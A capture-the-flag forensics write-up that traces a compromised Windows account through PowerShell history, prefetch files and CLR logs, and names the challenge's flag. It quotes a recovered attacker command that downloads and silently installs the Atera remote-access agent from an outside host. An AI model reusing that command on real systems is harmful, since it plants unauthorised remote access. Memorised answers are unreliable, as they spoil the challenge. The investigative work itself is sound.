# 

During the investigation, the goal was to determine which Windows user account had been compromised. The extracted disk image contained multiple user profiles: **IEUser**, **jowi**, and a service/update account **svc_patch.msedgewin10**.

---

## **1. PowerShell History Analysis**

Atera is a remote access tool commonly used in attacks, so the first step was to search for traces of Atera installation:

`grep -iR "atera" ./Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`

This revealed:

`./Users/svc_patch.MSEDGEWIN10/...: curl -L -o setup.msi "https://HelpdeskSupport.../GetAgent/Windows/?cid=1&aid=..." && msiexec /i setup.msi /qn`

This showed the attacker executed the Atera agent installation command.

---

## **2. Service Account ≠ Compromised Account**

The service account **svc_patch.msedgewin10** ran the malicious command, but service accounts are commonly abused _after_ compromise. They are not typically “the compromised identity” in DFIR challenges.

Most DFIR questions expect the compromised user to be a **normal user account**, not a system‑level service identity.

---

## **3. Searching Other User Artifacts**

Next step: determine which _human user_ the attacker originally took over.

All user profiles were inspected:

- **IEUser** → no malicious activity
    
- **svc_patch** → malicious execution, but clearly a service account
    
- **jowi** → activity found in logs and Windows CLR usage, indicating this profile had been actively used beyond defaults
    

Additional indicators (prefetch files, CLR logs, updated timestamps) consistently pointed to **jowi’s profile being interacted with**, making it the most likely foothold for the attacker.

---

## **4. Conclusion**

Although **svc_patch** executed the attacker’s command, the most logical and evidence‑backed compromised human user account was:

`jowi`

This was also confirmed as the correct flag for the challenge.